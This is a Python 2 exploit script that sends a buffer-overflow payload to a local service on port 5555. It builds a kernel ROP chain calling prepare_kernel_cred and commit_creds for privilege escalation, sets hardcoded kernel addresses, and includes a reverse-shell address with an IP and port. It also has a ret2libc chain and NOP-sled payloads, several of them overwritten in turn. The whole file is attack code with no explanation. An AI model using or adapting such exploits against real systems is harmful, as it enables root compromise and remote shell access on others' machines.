#! /usr/bin/env python2
import socket
import struct
from pwn import p64
offset=1024
port=5555
text_addr="\x00\x0b\x5d\xc0\xff\xff\xff\xff" #0xffffffffc05db000
redirect_addr="\xe0\x01\x43\xc0\xff\xff\xff\xff" #ffffffffc04301e0
exit_addr="\x64\x4c\x43\xc0\xff\xff\xff\xff" #ffffffffc0434c64
hello_addr="\x00\x30\x45\xc0\xff\xff\xff\xff" #0xffffffffc0453000
buf_addr="\x28\x81\x18\x51\xff\xff\xff\xff"
egg_variable_addr="\x8e\xe6\xff\xff"  # 0x0xffffe68e
syscall_table_addr=p64(0xffffffff81a00244)# ffffffff81a00240+0*4
print("syscall_table_addr",syscall_table_addr)									
commit_cred_addr=p64(0xffffffff810a2260)
prepare_kernel_cred_addr=p64(0xffffffff810a2590)
revshell_addr=p64(0xffffffffc03ce1e0)

# pop rdi; ret;NULL ; call <prepare_kernel_cred>;mov rax,rdi 
#; ret ; call <commit_creds>

rop_gadget=p64(0xffffffff812b9ecf)+p64(0x0)+prepare_kernel_cred_addr+p64(0xffffffff81077ef8)+commit_cred_addr
# payload=prefix+nopsled+buf +eip + padding 
eip = '\x58\xa9\xff\xff' #0xffffa958
PORT="\x7a\x69"
IPADDR="\x90\xf6\x1c\xac"




buf =  ""
buf+="\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a"

ret2libc=p64(0x7ffff7a31550)+"A"*8+p64(0x5555555546f4)


padding="B"*(1100-offset-4)
payload="A"*(offset-200-len(buf))+"\x90"*200+buf+eip+padding 
payload="HOLA"
payload="\x90"*offset+"\x90"*8+redirect_addr
payload="\x90"*offset+"\x90"*8+syscall_table_addr+"AAAABBBBCCCCDDDD"
payload="\x90"*offset+"\x90"*8+revshell_addr

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', port))
s.send(payload)
#print s.recv(1024)

s.close()